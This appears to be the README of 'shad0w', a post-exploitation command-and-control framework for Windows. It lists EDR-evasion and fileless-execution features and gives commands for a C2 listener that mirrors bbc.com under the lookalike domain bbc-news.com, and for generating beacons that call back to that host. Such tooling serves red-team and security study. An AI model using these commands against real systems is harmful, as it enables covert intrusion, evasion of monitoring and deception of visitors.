# shad0w

[![Project Status](https://img.shields.io/badge/status-BETA-yellow?style=flat-square)]()

shad0w is a post exploitation framework designed to operate covertly on heavily monitored environments

### Features

#### C2 Server

- Secure communication over HTTPS.
- Clone and live proxy any website, making the C2 fully browsable.

#### Beacons

- Staged and static beacons
- Shellcode and powershell formats allow for completely fileless attacks
- Uses native windows syscalls
- Bypasses userland API hooking
- Blocks EDR from loading DLLs into its process
- Can execute .NET assemblies, EXEs, DLLs, VBS, JS or XSL files completely in memory
- Common privilege escalation exploits built in
- Interact with the file system
- Configurable C2 callback jitter

#### Interface

- Asynchronous command line
- Auto complete
- Up/Down history
- Reverse command search
- Syntax highlighting

### Coming Soon

- Unmanaged powershell
- Syscalls for older versions of windows
- Kernel mode capability
- More privilege escalation exploits
- Ghost in the logs integration
- UAC bypasses
- Persistence
- 32 bit support
- More beacon formats

### Install

To install shad0w run the two commands below, making sure you already have docker installed on your system.

    $ git clone https://github.com/bats3c/shad0w.git && cd shad0w
    $ sudo ./shad0w install

### Usage

#### C2

To start the C2 server and have it listening for connections you can use the command.

    $ shad0w listen -e <endpoint>

Where the `<endpoint>` is the IP address or domain name the C2 will be listening on. SSL certificates will also be dynamically generated.

To use the website mirroring functionality you can use the `-m` or `--mirror` flag

    $ shad0w listen -e www.bbc-news.com -m "https://www.bbc.com/"

This will mean that if the C2s address of `www.bbc-news.com` is visited the content of `https://www.bbc.com/` will be retrieved and returned. This is also true for any links on the cloned website. If the person browsing the C2 navigated to `https://www.bbc-news.com/sport/football/52799575` the content at `https://www.bbc.com/sport/football/52799575` would be mirrored.

#### Beacons

*Only 64 bit beacons are currently supported*

There are two types of beacons, `secure` and `insecure`. Secure beacons have all the mitigation and evasions techniques built in such syscalls and anti dll injection. These secure beacons are designed to work on the lastest versions of windows.

The insecure beacons are designed to work on a wide variety of windows versions but are designed to be used in situations where detection does not matter.

The syntax for beacon generation.

    $ shad0w beacon -p <payload> -H <c2 address> -f <format> -o <filename>

The format for payloads follows the following syntax

    <arch>/<os>/<secure>/<static>

So to generate a static 64 bit secure windows beacon it would be

    x64/windows/secure/static

Although it is recommended to use staged beacons so the command to generate a staged secure beacon in EXE format would be

    $ shad0w beacon -p x64/windows/secure -H www.bbc-news.com -f exe -o beacon.exe

Or for an insecure beacon it would be

    $ shad0w beacon -p x64/windows -H www.bbc-news.com -f exe -o beacon.exe

There are currently 3 different beacon formats; exe, shellcode and powershell
The `-f` flags is used to control the different formats of the beacons.

To generate a beacon in shellcode or powershell format you can use the `raw` or `psh` value respectively 

    $ shad0w beacon -p x64/windows/secure -H www.bbc-news.com -f raw -o beacon.bin

    $ shad0w beacon -p x64/windows/secure/static -H www.bbc-news.com -f psh -o beacon.ps1

#### Interface

To get a list of commands you can use the `help` command

    shad0w ≫ help

To get a list of active beacons you can use the `beacons` command

    shad0w ≫ beacons

To interact with a beacon use the `beacons` command with the `-i` flag specifying the beacon id

    shad0w ≫ beacons -i 1

### Credits

- [JUMPSEC](https://www.jumpsec.com/) (for just generally being awesome)
- [The Wover](https://twitter.com/TheRealWover) (cause donut is so good)
